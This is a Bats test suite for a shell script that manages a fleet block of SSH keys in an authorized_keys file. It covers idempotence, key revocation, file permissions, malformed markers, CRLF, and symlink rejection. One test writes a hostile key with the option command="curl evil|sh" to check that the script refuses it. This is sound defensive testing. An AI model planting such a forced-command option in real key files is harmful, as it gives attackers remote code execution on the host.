#!/usr/bin/env bats

setup() {
  SCRIPT="${BATS_TEST_DIRNAME}/../scripts/fleet-authorize.sh"
  REPO="${BATS_TEST_TMPDIR}/repo"
  AK="${BATS_TEST_TMPDIR}/home/.ssh/authorized_keys"
  mkdir -p "$REPO/ssh/keys"
  KEY_A='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice@studio'
  KEY_B='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB alice@laptop'
  OWN='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCown hand-added'
}

@test "creates authorized_keys with a managed block and private modes" {
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 0 ]
  grep -qxF "$KEY_A" "$AK"
  [ "$(stat -f %Lp "$AK" 2>/dev/null || stat -c %a "$AK")" = 600 ]
  [ "$(stat -f %Lp "$(dirname "$AK")" 2>/dev/null || stat -c %a "$(dirname "$AK")")" = 700 ]
}

@test "preserves keys outside the block and is idempotent" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\n' "$OWN" > "$AK"
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  "$SCRIPT" "$REPO" "$AK"
  first="$(cat "$AK")"
  "$SCRIPT" "$REPO" "$AK"
  [ "$(cat "$AK")" = "$first" ]
  grep -qxF "$OWN" "$AK"
  [ "$(grep -cxF "$KEY_A" "$AK")" -eq 1 ]
}

@test "a key removed from the repo is revoked; an empty directory removes the block" {
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  printf '%s\n' "$KEY_B" > "$REPO/ssh/keys/laptop.pub"
  "$SCRIPT" "$REPO" "$AK"
  rm "$REPO/ssh/keys/laptop.pub"
  "$SCRIPT" "$REPO" "$AK"
  grep -qxF "$KEY_A" "$AK"
  ! grep -qF "$KEY_B" "$AK"
  rm "$REPO/ssh/keys/studio.pub"
  printf '%s\n' "$OWN" >> "$AK"
  "$SCRIPT" "$REPO" "$AK"
  ! grep -q 'harness:fleet' "$AK"
  grep -qxF "$OWN" "$AK"
}

@test "rejects option-bearing and multi-line key files without writing" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\n' "$OWN" > "$AK"
  printf 'command="curl evil|sh" %s\n' "$KEY_A" > "$REPO/ssh/keys/bad.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ "$(cat "$AK")" = "$OWN" ]
  printf '%s\n%s\n' "$KEY_A" "$KEY_B" > "$REPO/ssh/keys/bad.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ "$(cat "$AK")" = "$OWN" ]
}

@test "malformed markers abort without touching authorized_keys" {
  mkdir -p "$(dirname "$AK")"
  START='# harness:fleet start — managed by fleet-authorize.sh; edits inside are overwritten'
  END='# harness:fleet end'
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  for layout in \
    "$START|$OWN" \
    "$END|$OWN|$START|$KEY_B" \
    "$START|$END|$START|$END|$OWN" \
    "# harness:fleet start (edited)|$OWN|$END"; do
    printf '%s\n' "$layout" | tr '|' '\n' > "$AK"
    before="$(cat "$AK")"
    run "$SCRIPT" "$REPO" "$AK"
    [ "$status" -eq 1 ] || { echo "accepted: $layout"; return 1; }
    [ "$(cat "$AK")" = "$before" ]
  done
  printf '%s\r%s\r%s\r' "$START" "$KEY_B" "$END" > "$AK"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
}

@test "an indented managed block is recognized and its revoked key removed" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\n  %s\n%s\n\t%s\n' "$OWN" \
    '# harness:fleet start — managed by fleet-authorize.sh; edits inside are overwritten' \
    "$KEY_B" '# harness:fleet end' > "$AK"
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 0 ]
  ! grep -qF "$KEY_B" "$AK"
  grep -qxF "$OWN" "$AK"
  [ "$(grep -c 'harness:fleet start' "$AK")" -eq 1 ]
}

@test "a CRLF managed block is recognized and its revoked key removed" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\r\n%s\r\n%s\r\n%s\r\n' "$OWN" \
    '# harness:fleet start — managed by fleet-authorize.sh; edits inside are overwritten' \
    "$KEY_B" '# harness:fleet end' > "$AK"
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 0 ]
  ! grep -qF "$KEY_B" "$AK"
  grep -qxF "$KEY_A" "$AK"
  grep -qF "$OWN" "$AK"
  [ "$(grep -c 'harness:fleet start' "$AK")" -eq 1 ]
}

@test "blank lines around a key and symlinks are rejected" {
  printf '\n%s\n\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ ! -e "$AK" ]

  printf '%s\n' "$KEY_A" > "${BATS_TEST_TMPDIR}/elsewhere.pub"
  ln -sf "${BATS_TEST_TMPDIR}/elsewhere.pub" "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]

  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  mkdir -p "$(dirname "$AK")"
  printf '%s\n' "$OWN" > "${BATS_TEST_TMPDIR}/managed_keys"
  ln -s "${BATS_TEST_TMPDIR}/managed_keys" "$AK"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ -L "$AK" ]
  [ "$(cat "${BATS_TEST_TMPDIR}/managed_keys")" = "$OWN" ]
}

@test "missing key directory exits 2" {
  run "$SCRIPT" "${BATS_TEST_TMPDIR}/nowhere" "$AK"
  [ "$status" -eq 2 ]
  [ ! -e "$AK" ]
}
